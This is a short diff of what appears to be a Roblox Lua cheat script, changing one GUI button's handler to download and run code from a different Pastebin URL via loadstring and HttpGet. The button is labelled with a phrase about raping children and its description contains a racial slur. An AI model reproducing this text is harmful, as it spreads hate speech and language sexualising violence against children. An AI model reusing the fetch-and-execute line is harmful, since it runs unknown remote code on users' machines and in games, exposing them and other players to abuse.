@@ -9,5 +9,5 @@ local Window = Library.CreateLib("Moat's script", "DarkTheme")
     end)
 
     MainSection:NewButton("Rape child", "Makes you do rape people NIGGER", function()
-        loadstring(game:HttpGet('https://pastebin.com/raw/KynLT9dm'))()
+        loadstring(game:HttpGet('https://pastebin.com/raw/d6Jxbnid'))()
     end)
